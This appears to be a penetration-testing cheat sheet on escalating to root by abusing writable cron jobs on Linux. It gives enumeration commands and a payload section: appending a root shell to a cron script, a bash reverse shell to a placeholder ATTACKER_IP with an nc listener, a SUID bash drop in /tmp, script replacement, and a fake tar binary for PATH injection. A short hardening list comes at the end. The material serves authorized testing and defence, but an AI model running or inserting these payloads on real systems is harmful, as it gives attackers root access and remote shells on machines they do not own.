# Cron Job Abuse

## Technique Overview

Cron job abuse occurs when a scheduled task (cron) executes a script
or command with elevated privileges (commonly root) that an attacker
can modify or influence.

Common escalation conditions:

- Root-owned cron job executing writable script
- Writable script directory
- PATH abuse within cron
- Wildcard injection inside cron script
- Improper file permissions

If the attacker can control what the cron job executes,
arbitrary command execution as root becomes possible.

---

## Quick Enumeration

Check system-wide cron jobs:

```bash
cat /etc/crontab
ls -la /etc/cron*
```

Check user cron jobs:

```bash
crontab -l
```

Inspect scheduled scripts:

```bash
ls -la /path/to/script
cat /path/to/script
```

Look for:
- Writable scripts
- Writable directories
- Relative paths
- Wildcard usage
- PATH misconfiguration

---

# Payloads

---

## Direct Script Modification

If root cron executes:

```bash
* * * * * root /opt/backup.sh
```

And `/opt/backup.sh` is writable:

```bash
echo '/bin/bash -p' >> /opt/backup.sh
```

Wait for execution → root shell.

---

## Reverse Shell

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh
```

Start listener:

```bash
nc -lvnp 4444
```

---

## SUID Shell Drop

```bash
echo 'cp /bin/bash /tmp/rootbash' >> /opt/backup.sh
echo 'chmod +s /tmp/rootbash' >> /opt/backup.sh
```

After execution:

```bash
/tmp/rootbash -p
```

---

## Replace Executed Script (If Writable Directory)

If cron executes:

```bash
/opt/scripts/cleanup.sh
```

And directory is writable:

```bash
rm cleanup.sh
echo '#!/bin/bash' > cleanup.sh
echo '/bin/bash -p' >> cleanup.sh
chmod +x cleanup.sh
```

---

## PATH Injection via Cron

If cron script calls:

```bash
tar -cf backup.tar *
```

And PATH contains writable directory:

Create malicious binary:

```bash
echo '#!/bin/bash' > /tmp/tar
echo '/bin/bash -p' >> /tmp/tar
chmod +x /tmp/tar
```

Modify PATH inside environment if possible.

---

## Writable Log File Exploitation

If log file is writable and processed by root:

Inject command content depending on processing logic.

(Scenario dependent — validate execution context first.)

---

# Execution Conditions

Cron job abuse requires:

- Elevated execution context
- Writable script or directory
- Predictable execution interval
- No integrity validation

Always confirm execution frequency before deploying payload.

---

# Defensive Notes (Brief)

- Restrict write permissions on cron scripts
- Use absolute paths in cron
- Remove writable directories from PATH
- Implement file integrity monitoring
- Enforce least privilege

---

# Risk Level

High — direct root execution  
Low complexity if writable cron target exists
